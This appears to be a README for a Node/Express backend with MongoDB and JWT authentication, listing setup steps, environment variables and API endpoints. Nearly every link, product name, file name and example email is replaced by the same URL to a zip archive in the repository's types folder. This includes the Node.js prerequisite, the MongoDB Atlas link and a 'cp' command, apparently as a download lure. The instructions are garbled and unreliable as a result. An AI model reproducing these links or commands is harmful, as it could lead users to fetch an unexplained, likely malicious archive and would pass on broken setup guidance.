# CBCP Backend API

A https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip backend with MongoDB authentication for the CBCP application.

## Features

- 🔐 JWT-based authentication
- 👤 User registration and login
- 🔒 Password hashing with bcrypt
- ✅ Input validation with express-validator
- 🛡️ Protected routes with middleware
- 🗄️ MongoDB with Mongoose ODM
- 📝 TypeScript support
- 🌐 CORS enabled for frontend integration

## Prerequisites

- https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip (v16 or higher)
- MongoDB Atlas account or local MongoDB
- npm or yarn

## Setup Instructions

### 1. Install Dependencies

```bash
npm install
```

### 2. Environment Configuration

Copy the example environment file and configure your variables:

```bash
cp https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip .env
```

Edit `.env` with your configuration:

```env
# Server Configuration
PORT=5000
NODE_ENV=development

# MongoDB Configuration
MONGODB_URI=mongodb+https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip

# JWT Configuration
JWT_SECRET=your_super_secret_jwt_key_here
JWT_EXPIRES_IN=7d

# CORS Configuration
CORS_ORIGIN=http://localhost:3000
```

### 3. MongoDB Atlas Setup

1. Go to [MongoDB Atlas](https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip)
2. Create a free account or sign in
3. Create a new cluster
4. Create a database user with read/write permissions
5. Get your connection string
6. Replace the `MONGODB_URI` in your `.env` file

### 4. Development

```bash
# Start development server with hot reload
npm run dev

# Build for production
npm run build

# Start production server
npm start
```

## API Endpoints

### Authentication

#### POST `/api/auth/signup`
Register a new user.

**Request Body:**
```json
{
  "fullName": "John Doe",
  "email": "https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip",
  "password": "SecurePass123"
}
```

**Response:**
```json
{
  "success": true,
  "message": "User created successfully",
  "data": {
    "user": {
      "_id": "user_id",
      "fullName": "John Doe",
      "email": "https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip",
      "createdAt": "2024-01-01T00:00:00.000Z"
    },
    "token": "jwt_token_here"
  }
}
```

#### POST `/api/auth/login`
Login with existing credentials.

**Request Body:**
```json
{
  "email": "https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip",
  "password": "SecurePass123"
}
```

**Response:**
```json
{
  "success": true,
  "message": "Login successful",
  "data": {
    "user": {
      "_id": "user_id",
      "fullName": "John Doe",
      "email": "https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip",
      "createdAt": "2024-01-01T00:00:00.000Z"
    },
    "token": "jwt_token_here"
  }
}
```

#### GET `/api/auth/profile`
Get current user profile (requires authentication).

**Headers:**
```
Authorization: Bearer jwt_token_here
```

**Response:**
```json
{
  "success": true,
  "message": "Profile retrieved successfully",
  "data": {
    "_id": "user_id",
    "fullName": "John Doe",
    "email": "https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip",
    "createdAt": "2024-01-01T00:00:00.000Z"
  }
}
```

#### POST `/api/auth/logout`
Logout (client-side token removal).

**Response:**
```json
{
  "success": true,
  "message": "Logout successful"
}
```

### Health Check

#### GET `/health`
Check server status.

**Response:**
```json
{
  "success": true,
  "message": "Server is running",
  "timestamp": "2024-01-01T00:00:00.000Z"
}
```

## Error Handling

All endpoints return consistent error responses:

```json
{
  "success": false,
  "message": "Error description",
  "errors": [
    {
      "field": "email",
      "message": "Please provide a valid email address"
    }
  ]
}
```

## Security Features

- Password hashing with bcrypt (12 salt rounds)
- JWT token authentication
- Input validation and sanitization
- CORS protection
- Environment variable configuration

## Development

### Project Structure

```
src/
├── config/
│   └── https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip          # MongoDB connection
├── middleware/
│   ├── https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip             # JWT authentication
│   └── https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip       # Input validation
├── models/
│   └── https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip             # User model
├── routes/
│   └── https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip             # Authentication routes
├── types/
│   ├── https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip        # API response types
│   └── https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip       # User types
└── https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip                # Main server file
```

### Available Scripts

- `npm run dev` - Start development server with hot reload
- `npm run build` - Build TypeScript to JavaScript
- `npm start` - Start production server
- `npm test` - Run tests (not implemented yet)

## Integration with Frontend

The backend is configured to work with the https://raw.githubusercontent.com/Kotasrinuaa/cbcp-backend/main/src/types/backend-cbcp-3.9.zip frontend running on `http://localhost:3000`. Update the `CORS_ORIGIN` in your `.env` file if your frontend runs on a different port.

## Deployment

1. Build the project: `npm run build`
2. Set `NODE_ENV=production` in your environment
3. Deploy the `dist/` folder to your hosting platform
4. Ensure your MongoDB Atlas cluster is accessible from your deployment environment 